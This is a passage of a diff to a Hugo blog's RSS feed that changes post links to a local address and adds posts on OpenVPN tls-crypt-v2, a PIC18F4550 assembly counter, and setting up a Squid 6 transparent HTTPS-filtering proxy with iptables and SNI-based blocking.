+&lt;p&gt;en la configuración usamos tls-crypt-v2 que nos permite ofuscar el handshake de openvpn.&lt;/p&gt;
+&lt;p&gt;podemos ver la documentacion de  tls-crypt-v2&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/OpenVPN/openvpn/blob/master/doc/tls-crypt-v2.txt&#34;&gt;https://github.com/OpenVPN/openvpn/blob/master/doc/tls-crypt-v2.txt&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;ls-crypt-v2 uses an encrypted cookie mechanism to introduce client-specific tls-crypt keys without introducing a lot of server-side state. The client-specific key is encrypted using a server key.  The server key is the same for all servers in a group.  When a client connects, it first sends the encrypted key to the server, such that the server can decrypt the key and all messages can thereafter be encrypted using the client-specific key.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;A wrapped (encrypted and authenticated) client-specific key can also contain metadata.  The metadata is wrapped together with the key, and can be used to allow servers to identify clients and/or key validity.  This allows the server to abort the connection immediately after receiving the first packet, rather than performing an entire TLS handshake.  Aborting the connection this early greatly improves the DoS resilience and reduces attack surface against malicious clients that have the tls-crypt or tls-auth key.  This is particularly relevant for large deployments (think lost key or disgruntled employee) and VPN providers (clients are not trusted).&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Una vez que usamos  tls-crypt-v2 ya no es detecatdo por el Deep Packet Inspection
+&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/6a447095ab96f0e0c7ba6014a0f72ccdc12871632c5f09e0ad9d6c2fadf647f5f7f56183a3f0ce5fcf96085e6177f072f9d73787e24e1219882383df5d4f4838.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/cd742e78ab8f75f43e5cc75f28c473ae00eaeb5c5659b83de68f1f6b7ac9573068f5681d2863ef67c0ddc4657703b1635d3aba24b7c6937bd9ce2e7434d2c61c.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/7cd41183b6f6c952ad63be22d0d948c53fdf0a4daa4b5857c1822f669cbbe3a3f129fd03b000a3fc5e0efd203c53b19da3d9a0a9162aad00846fa0f7340cb5f4.png&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>contador ascendente y descendente  con Display de 7 Segmentos para PIC18F4550 en Ensamblador</title>
+      <link>http://10.10.8.69:1313/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</link>
+      <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
+      
+      <guid>http://10.10.8.69:1313/posts/contador-ascendente-y-descendente-con-display-de-7-segmentos-para-pic18f4550-en-ensamblador/</guid>
       <description>En este proyecto se va a desarrollar un contador ascendente y descendente utilizando el microcontrolador PIC18F4550 en ensamblador. usando un Display de 7 Segmentos para mostrar los valores del contador en orden ascendente y descendente.
 algunos de los pasos se expican en el contador automatico que se encuentra en
 https://devnotescode.com/Pages?id=677437501f54d06c6ecb8012
@@ -424,10 +799,10 @@ LIST P = 18F4550 INCLUDE &amp;lt;P18F4550.INC&amp;gt; ;contador de cambio automa
     
     <item>
       <title>How to Add Images to Your Hugo Posts</title>
-      <link>https://PacodiazDG.github.io/posts/how-to-add-images/</link>
+      <link>http://10.10.8.69:1313/posts/how-to-add-images/</link>
       <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
       
-      <guid>https://PacodiazDG.github.io/posts/how-to-add-images/</guid>
+      <guid>http://10.10.8.69:1313/posts/how-to-add-images/</guid>
       <description>Adding images to your Hugo posts is simple using Markdown.
 Embedding an Image You can embed an image like this:
 ![Alt text for the image](/images/my-awesome-image.jpg)
@@ -441,6 +816,90 @@ Image with a Caption Some themes might support captions. Check your theme&amp;rs
 &lt;h3 id=&#34;image-with-a-caption&#34;&gt;Image with a Caption&lt;/h3&gt;
 &lt;p&gt;Some themes might support captions. Check your theme&amp;rsquo;s documentation!&lt;/p&gt;
 </content>
+    </item>
+    
+    <item>
+      <title>Squid proxy 6.0 for Https Filter [Ubuntu 24.04 LTS] [Transparent Proxy]  </title>
+      <link>http://10.10.8.69:1313/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</link>
+      <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
+      
+      <guid>http://10.10.8.69:1313/posts/squid-proxy-6.0-for-https-filter-ubuntu-24.04-lts-transparent-proxy/</guid>
+      <description>Squid Proxy is a great tool that allows us to do multiple things; one of them is to function as a forward proxy, and with the use of ACLs, we can filter sites using the SNI.
+installation Squid proxy is installed via apt-get. The squid-openssl version is of interest to us since it contains ssl-bump. If our distribution does not include squid-openssl, it must be installed manually.
+sudo apt-get install squid-openssl We generate the SSL certificates, remember they must be in /etc/squid/ssl; otherwise, Squid will not trust the certificate.</description>
+      <content>&lt;p&gt;Squid Proxy is a great tool that allows us to do multiple things; one of them is to function as a forward proxy, and with the use of ACLs, we can filter sites using the SNI.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;installation&#34;&gt;installation&lt;/h2&gt;
+&lt;p&gt;Squid proxy is installed via apt-get. The squid-openssl version is of interest to us since it contains ssl-bump. If our distribution does not include squid-openssl, it must be installed manually.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install squid-openssl
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/9034cefa695d9cf73265449df6f2ba05025a2268660c542a44fb1107d1ef4b2610cde1591a62ded00bde3f9d8d2aa3d307087828e21ae3a8b9cfe05567708983.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We generate the SSL certificates, remember they must be in /etc/squid/ssl; otherwise, Squid will not trust the certificate.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /etc/ssl/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo openssl ecparam -name prime256v1 -genkey -noout -out sslsquid.key
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo  openssl req -x509 -days &lt;span style=&#34;color:#ae81ff&#34;&gt;365&lt;/span&gt; -nodes -key sslsquid.key -out sslsquid.crt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For Squid Proxy 6.0, it gives the following error if it’s not installed in /etc/ssl/.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;× squid.service - Squid Web Proxy Server
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Loaded: loaded &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;/usr/lib/systemd/system/squid.service; enabled; preset: enabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Active: failed &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Result: exit-code&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; since Fri 2024-06-07 05:48:16 CST; 4s ago
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   Duration: 25min 6.288s
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       Docs: man:squid&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;8&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Process: &lt;span style=&#34;color:#ae81ff&#34;&gt;4522&lt;/span&gt; ExecStartPre&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/sbin/squid --foreground -z &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;code&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exited, status&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1/FAILURE&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        CPU: 54ms
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: 2024/06/07 05:48:16|   Finished.  Wrote &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; entries.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: 2024/06/07 05:48:16|   Took 0.00 seconds &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;  0.00 entries/sec&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: 2024/06/07 05:48:16| FATAL: No valid signing certificate configured &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; HTTPS_port &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;::&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:3135
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: 2024/06/07 05:48:16| Squid Cache &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Version 6.6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: Terminated abnormally.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: CPU Usage: 0.060 seconds &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0.047 user + 0.013 sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: Maximum Resident Size: &lt;span style=&#34;color:#ae81ff&#34;&gt;74752&lt;/span&gt; KB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform squid&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;4522&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: Page faults with physical i/o: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform systemd&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: squid.service: Control process exited, code&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;exited, status&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1/FAILURE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform systemd&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: squid.service: Failed with result &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exit-code&amp;#39;&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Jun &lt;span style=&#34;color:#ae81ff&#34;&gt;07&lt;/span&gt; 05:48:16 toor-VMware-Virtual-Platform systemd&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;: Failed to start squid.service - Squid Web Proxy Server.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To configure Squid, we do the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; cd /etc/squid/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sudo nano squid.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To configure Squid, we do the following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http_port &lt;span style=&#34;color:#ae81ff&#34;&gt;3131&lt;/span&gt; intercept
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https_port &lt;span style=&#34;color:#ae81ff&#34;&gt;3135&lt;/span&gt; intercept ssl-bump tls-cert&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/ssl/sslsquid.crt tls-key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/etc/ssl/sslsquid.key generate-host-certificates&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;on dynamic_cert_mem_cache_size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;16MB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http_access allow localnet
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/3929c81e35a5719f6884afb94c6b337e6e0ef3f7aeed5fb0221f7343a9518fd80bb5963bf063c1dc565766d63f487d5f496373386e72b2022804c916385328bf.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Uncomment the following line.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Default:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sslcrtd_program /usr/lib/squid/security_file_certgen -s /var/spool/squid/ssl_db -M 4MB
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/b69d71a0d29f37d5f070dcb09c0093615969d27c1aa02be7abe62e7ff5cb774efb1ff8e50975ffd64ef13f2d8bf8acf9c0f2ff34e40416805def1bcc3e39573f.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We have to configure iptables so that the traffic goes through squid proxy&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -t nat -I PREROUTING  -p tcp -m tcp --dport &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt; -j REDIRECT --to-ports &lt;span style=&#34;color:#ae81ff&#34;&gt;3135&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -t nat -I PREROUTING  -p tcp -m tcp --dport &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; -j REDIRECT --to-ports &lt;span style=&#34;color:#ae81ff&#34;&gt;3131&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo sysctl -w net.ipv4.ip_forward&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;access-controls&#34;&gt;Access Controls&lt;/h2&gt;
+&lt;p&gt;We create a file where the domains to be blocked will be&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sudo mkdir /blockwebsites
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd /blockwebsites
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nano list1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We add example.com as an example.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;example.com&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;block-web-site-via-sni-server-name-indication&#34;&gt;Block web site via SNI (Server Name Indication)&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo nano /etc/squid/squid.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We add the following at the end of the configuration.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;acl monitoredSites ssl::server_name &amp;#34;/blockwebsites/list1&amp;#34;
+ssl_bump terminate monitoredSites
+ssl_bump peek all
+ssl_bump splice all
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this case we do not want to interfere with the original certificate we use
+ssl_bump peek all
+ssl_bump splice all&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wiki.squid-cache.org/Features/SslPeekAndSplice&#34;&gt;https://wiki.squid-cache.org/Features/SslPeekAndSplice&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8eae27349b3b1381cd930ef923d1d0cea41e9adfd9d4338ace34a7621045d44926cadff03f5a9dfe7edc0143a14f362eb646ba7c50183987d09e8110ab6770ae.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/d7f81f61121521e249fb31d971fe372b7f84421cdb298263324d49d21ab00a9d32e14769101222af4cca06a21b134474a1c9155df279f85da6aab82a2b498b91.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The website is working without installing any certificate on the client&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/edf1786ab6b3bb51266cf81f277a1e68f584652482d2f83d745e3735ce984744343a21f0516d1081e80c263bac1d44fcb491452a3dd89a1e392607a741022d31.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;block-quic-using-the-firewall-policy&#34;&gt;Block QUIC using the firewall policy.&lt;/h1&gt;
+&lt;p&gt;Squid Proxy does not support QUIC, so we have to disable it.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo iptables -I FORWARD -p udp --dport 443 -j REJECT --reject-with icmp-port-unreachable
+&lt;/code&gt;&lt;/pre&gt;</content>
     </item>
     
   </channel>
